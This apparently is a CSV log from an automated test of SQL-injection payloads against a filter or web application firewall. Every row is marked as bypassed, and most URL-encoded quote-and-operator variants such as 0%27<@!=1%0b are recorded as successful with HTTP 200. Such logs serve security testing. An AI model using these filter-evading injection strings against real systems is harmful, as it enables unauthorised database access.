Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0161,73.09,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,73.09,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.011,73.09,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0176,73.09,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.022,72.66,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.011,72.66,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0131,72.66,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0164,72.66,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0199,72.66,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,72.66,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,72.66,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0186,72.88,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0203,73.06,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0151,73.09,No,500
0%27or+,Bypassed,Yes,unionAtk,Unknown,0.0211,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0233,73.09,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.016,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0118,73.09,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0281,73.09,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0166,73.09,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,73.09,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0235,73.09,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0111,73.09,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,73.09,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0231,73.09,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0213,73.09,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0143,73.09,No,500
0'<@=1+,Bypassed,No,None,Unknown,0.0178,73.09,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0132,73.09,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0133,73.09,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.017,73.09,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0168,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0119,73.09,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0104,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0112,73.09,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0127,73.09,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0149,73.09,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0165,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0081,73.09,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0104,73.09,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,73.09,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.015,73.09,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0092,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0132,73.09,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0206,73.09,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0136,73.09,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0129,73.09,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,73.09,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0157,73.09,No,500
0%27||%0b,Bypassed,Yes,unionAtk,Unknown,0.028,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0129,73.09,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0143,73.09,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0149,72.66,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0131,72.66,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0168,72.66,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0297,72.66,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0154,72.66,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,72.66,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0149,72.74,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,72.96,No,200
0'||%0b,Bypassed,No,None,Unknown,0.0149,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0134,73.09,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0093,73.09,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0133,73.09,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0197,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0215,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0136,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0153,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0088,73.09,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.016,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0157,73.09,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.014,73.09,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0235,73.09,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0202,73.09,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0178,73.09,No,500
0'||%0b,Bypassed,No,None,Unknown,0.0119,73.09,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,73.09,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0105,73.09,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0124,73.09,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0097,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0169,73.09,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0086,73.09,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,73.09,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0124,73.09,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0135,73.09,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0122,73.09,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0094,73.09,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,73.09,No,200
0%27or+,Bypassed,Yes,unionAtk,Unknown,0.0223,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0107,73.09,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0099,73.09,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0067,73.09,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0119,73.09,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,73.09,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0077,73.09,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0061,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0102,73.09,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.015,73.09,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0174,73.09,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0187,73.09,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.009,73.09,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0144,72.66,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,72.66,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0159,72.69,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0176,72.88,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0207,73.09,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0175,73.09,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0133,73.09,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0118,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0108,73.09,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.023,73.09,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0185,73.09,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0189,73.09,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0144,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0097,73.09,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0125,73.09,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0165,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0168,73.09,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0206,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0184,73.09,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0176,73.09,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0135,73.09,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0162,73.09,No,500
0%27||%0b,Bypassed,Yes,unionAtk,Unknown,0.0088,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0078,73.09,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0071,73.09,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0209,73.09,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0132,73.09,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0185,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0117,73.09,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0077,73.09,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0091,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0091,73.09,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0141,73.09,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,73.09,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,73.09,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0097,73.09,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0187,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0111,73.09,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0142,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0114,73.09,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0076,73.09,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0125,73.09,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,73.09,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0197,73.09,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0221,73.09,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0075,73.09,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0162,73.09,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0231,73.09,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0269,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0221,73.09,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.006,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0184,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0177,73.09,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0141,73.09,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,73.09,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0233,73.09,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0125,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0148,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0087,73.09,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0192,73.09,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0174,73.09,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0152,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0201,73.09,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0202,73.09,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0209,73.09,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0109,73.09,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0135,73.09,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0231,73.09,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.015,73.09,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,73.09,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0173,73.09,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,73.23,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0144,73.36,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0095,73.36,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0103,73.36,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0124,73.36,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0164,73.36,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0171,73.36,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0066,73.36,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.018,73.36,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0145,73.36,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0136,73.36,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0119,73.36,No,500
0'or+,Bypassed,No,None,Unknown,0.0088,73.36,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0242,73.36,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0177,73.36,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0095,73.36,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,73.36,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,73.36,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0067,73.36,No,500
0'<@=1+,Bypassed,No,None,Unknown,0.0204,73.36,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0129,73.36,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0097,73.36,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,73.36,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0076,73.36,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0112,73.36,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0125,73.36,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0146,73.36,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.015,73.36,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0107,73.09,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,73.09,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0157,73.09,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0135,73.09,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0209,73.09,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0201,73.09,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0224,73.09,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.023,73.09,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0111,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0199,73.09,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0127,73.09,No,200
0'||+,Bypassed,No,None,Unknown,0.024,73.09,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0197,73.09,No,500
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0243,73.09,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0103,73.09,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0128,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0108,73.09,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0134,73.09,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,73.09,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0239,73.22,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,73.36,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0168,73.36,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0206,73.36,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0202,73.36,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0129,73.36,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0167,73.36,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0118,73.36,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0096,73.36,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0172,73.36,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0188,73.36,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0138,73.36,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0132,73.36,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,73.36,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0217,73.36,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0184,73.36,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0091,73.36,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0097,73.36,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0143,73.36,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0126,73.36,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0144,73.36,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0097,73.36,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,73.36,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0083,73.36,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0123,73.36,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0156,73.36,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0136,73.36,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0132,73.36,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.009,73.36,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0132,73.36,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0182,73.09,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0178,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0196,73.09,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0165,73.09,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0162,73.09,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0169,73.09,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0116,73.09,No,500
0'||+,Bypassed,No,None,Unknown,0.0235,73.09,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0083,73.09,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0131,73.09,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0153,73.09,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0189,73.09,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0229,73.09,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0197,73.09,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,73.09,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0139,73.09,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0138,73.09,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0096,73.09,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0161,73.09,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0153,73.21,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0109,73.36,No,200
0'||%0b,Bypassed,No,None,Unknown,0.0188,73.36,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0155,73.36,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,73.36,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0164,73.36,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0153,73.36,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0126,73.36,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0155,73.36,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0141,73.36,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0106,73.36,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0227,73.36,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0153,73.36,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0116,73.36,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0145,73.36,No,500
0'or+,Bypassed,No,None,Unknown,0.0123,73.36,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0136,73.36,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0066,73.36,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.016,73.36,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.014,73.36,No,500
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,73.36,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,73.36,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0091,73.36,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0128,73.36,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.015,73.36,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0128,73.36,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,73.36,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0216,73.36,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0098,73.36,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,73.36,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0161,73.09,No,500
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0176,73.09,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,73.09,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0115,73.09,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0208,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0138,73.09,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0123,73.09,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0155,73.09,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0177,73.09,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0102,73.09,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0107,73.09,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0259,73.09,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0119,73.09,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0194,73.09,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0113,73.09,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0155,73.09,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0127,73.09,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0107,73.09,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0184,73.09,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0128,73.09,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0141,73.09,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0244,73.27,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0155,73.36,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0173,73.36,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0171,73.36,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0138,73.36,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0224,73.36,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0079,73.36,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0148,73.36,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0139,73.36,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0116,73.36,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0168,73.36,No,200
